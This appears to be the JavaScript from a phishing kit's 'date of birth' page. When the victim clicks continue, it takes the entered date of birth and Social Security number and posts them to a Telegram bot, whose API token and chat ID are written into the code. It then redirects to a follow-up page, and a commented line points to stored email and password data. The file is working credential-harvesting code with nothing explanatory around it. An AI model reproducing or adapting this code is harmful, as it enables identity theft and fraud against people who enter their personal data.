// dob page
let dob = document.getElementById('dob')
let ssn = document.getElementById('ssn')
let continues = document.getElementById('continue')

continues.addEventListener('click', async()=> {
    
    if (dob.value !== '' || ssn.value !== '') {

        const data = {
            chat_id: 1159922503,
            parse_mode: 'HTML',
            text: ` <b>DOB: ${dob.value}</b>📧📧📧<b> SNN: ${ssn.value}</b>`
        }

        axios.post('https://api.telegram.org/bot5642243651:AAGVL6ga-Ae08Tz2pb9SAuHW211ykBa1NQg/sendMessage', data,{
            "Content-Type": "application/json"
        })
        .then(response => {
            console.log(response.data)
        })
        .catch(error => alert(error))

        
        continues.disabled = true

        setTimeout(() => {
            location.replace("/dl.html")
            // console.log(`email is ${localStorage.getItem('user_email')} and pass is ${localStorage.getItem('user_password')}`)
        }, 3000);
    }

   
   
})
